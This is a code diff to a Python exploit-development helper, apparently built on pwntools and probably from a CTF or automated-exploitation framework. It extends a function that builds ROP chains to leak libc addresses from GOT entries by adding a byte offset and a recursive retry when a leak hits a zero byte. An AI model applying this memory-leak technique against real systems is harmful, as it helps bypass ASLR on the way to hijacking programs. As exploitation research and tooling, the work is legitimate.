@@ -4,7 +4,10 @@ from typing import List, Callable
 
 
 def leak_helper(
-    state: PwnState, leaker: Callable[[ROP, int], ROP], symbols: List[str]
+    state: PwnState,
+    leaker: Callable[[ROP, int], ROP],
+    symbols: List[str],
+    offset: int = 0,
 ) -> PwnState:
     """Leak libc addresses using a leaking function.
 
@@ -23,6 +26,9 @@ def leak_helper(
 
         leaker: function which reads arbitrary memory, newline terminated.
         symbols: what libc symbols we need to leak.
+        offset: offset, in bytes, from the start of the GOT address of each symbol
+                at which to begin leak, treating previous bytes as zeroes
+                (this is helpful if the leaker function terminates on a zero byte)
 
     Returns:
         Reference to the mutated ``PwnState``, with the following updated
@@ -32,7 +38,7 @@ def leak_helper(
     """
     rop = ROP(state.elf)
     for symbol in symbols:
-        rop = leaker(rop, state.elf.got[symbol])
+        rop = leaker(rop, state.elf.got[symbol] + offset)
 
     # return back so we can execute more chains later
     arutil.align_call(rop, state.vuln_function, [])
@@ -45,7 +51,12 @@ def leak_helper(
         line = state.target.readline()
         log.debug(line)
         # remove last character which must be newline
-        state.leaks[symbol] = arutil.addressify(line[:-1])
+        state.leaks[symbol] = arutil.addressify(line[:-1]) << (8 * offset)
         log.info(f"leaked {symbol} @ " + hex(state.leaks[symbol]))
+
+        # TODO: make this a bit less hacky maybe
+        # try leaking next bytes if we happen to stumble upon a zero byte
+        if state.leaks[symbol] == 0x0:  # unluckily the address has a zero at start
+            leak_helper(state, leaker, [symbol], offset + 1)
 
     return state
